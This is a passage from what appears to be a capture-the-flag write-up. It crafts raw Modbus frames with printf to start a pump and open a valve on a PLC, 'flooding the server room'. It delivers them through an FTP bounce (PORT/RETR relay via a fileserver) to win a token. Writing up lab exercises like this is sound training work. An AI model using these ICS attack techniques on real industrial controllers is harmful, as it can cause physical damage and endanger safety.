Then we need to start the pump by writing a 1 to register 11: 

```bash
printf '\x00\x02\x00\x00\x00\x06\x01\x06\x00\x0b\x00\x01' >> fill_tank.bin
```

When the tank is full, we can open the valve by writing a 1 to register 21, thus flooding the server room: 

```bash
printf '\x00\x03\x00\x00\x00\x06\x01\x06\x00\x15\x00\x01' > empty_tank.bin
```

We just need to make our two bins, `fill_tank.bin` and `empty_tank.bin`
Then we can upload them to the `fileserver` and port them through to the `plc`, giving us the final token. 

```bash
printf '\x00\x03\x00\x00\x00\x06\x01\x06\x00\x15\x00\x00' > fill_tank.bin
printf '\x00\x01\x00\x00\x00\x06\x01\x06\x00\x14\x00\x64' >> fill_tank.bin
printf '\x00\x02\x00\x00\x00\x06\x01\x06\x00\x0b\x00\x01' >> fill_tank.bin
printf '\x00\x03\x00\x00\x00\x06\x01\x06\x00\x15\x00\x01' > empty_tank.bin
```

As an alternative to running the commands manually, you can clear the `payloads` directory, place `fill_tank.bin` inside, then run the Python script. Replace with `empty_tank.bin`, and run it again once it is full.

```bash
ftp fileserver
```

```bash
#in ftp prompt
binary
put fill_tank.bin
put empty_tank.bin
quote PORT 172,20,0,2,19,156 #replace this with your target ip
quote RETR fill_tank.bin
quote RETR empty_tank.bin
```

![Fill Tank](imgs/43-fill-tank.png)
![Flood to Get Token4](imgs/44-flood-token.png)

After flooding the tank we will get the final token: `PCCC{Flood_Servers_Token}`
